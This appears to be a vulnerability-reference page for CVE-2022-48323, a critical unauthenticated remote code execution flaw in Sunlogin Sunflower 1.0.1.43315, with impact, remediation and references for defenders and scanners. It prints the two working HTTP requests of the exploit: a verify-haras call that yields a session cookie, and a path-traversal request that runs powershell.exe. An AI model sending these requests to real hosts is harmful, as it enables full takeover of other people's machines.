---
layout: "post"
cve_id: "CVE-2022-48323"
title: "Sunflower Simple and Personal 1.0.1.43315 - Remote Code Execution"
pcap: true
pcap_path: "/pcaps/2022/CVE-2022-48323.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-48323.yaml"
author: "daffainfo"
severity: "critical"
impact: "Unauthenticated attackers can exploit path traversal to execute arbitrary programs on the victim host, potentially executing PowerShell commands and gaining full system control over the remote desktop application server.
"
remediation: "Upgrade Sunlogin Sunflower to a version newer than 1.0.1.43315 that properly validates command parameters and prevents path traversal to system executables.
"
reference:
  - "https://www.1024sou.com/article/741374.html"
  - "https://copyfuture.com/blogs-details/202202192249158884"
  - "https://www.cnvd.org.cn/flaw/show/CNVD-2022-10270"
  - "https://www.cnvd.org.cn/flaw/show/CNVD-2022-03672"
  - "https://asec.ahnlab.com/en/47088/"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 9.8, 'cve-id': 'CVE-2022-48323', 'cwe-id': 'CWE-22', 'epss-score': 0.9069, 'epss-percentile': 0.99596, 'cpe': 'cpe:2.3:a:sunlogin:sunflower:1.0.1.43315:*:*:*:simple:*:*:*'}"
metadata: "{'max-request': 2, 'vendor': 'sunlogin', 'product': 'sunflower'}"
tags:
  - "cve"
  - "cve2022"
  - "sunflower"
  - "rce"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
Sunlogin Sunflower Simplified (aka Sunflower Simple and Personal) 1.0.1.43315 is vulnerable to a path traversal issue. A remote and unauthenticated attacker can execute arbitrary programs on the victim host by sending a crafted HTTP request, as demonstrated by /check?cmd=ping../ followed by the pathname of the powershell.exe program.


## üåê HTTP Request
```nohighlight
POST /cgi-bin/rpc HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Connection: close
Content-Length: 19
Accept-Encoding: gzip

action=verify-haras
```

```nohighlight
GET /check?cmd=ping../../../windows/system32/windowspowershell/v1.0/powershell.exe+ipconfig HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.6
Connection: close
Cookie: CID=2JkbDV
Accept-Encoding: gzip
```

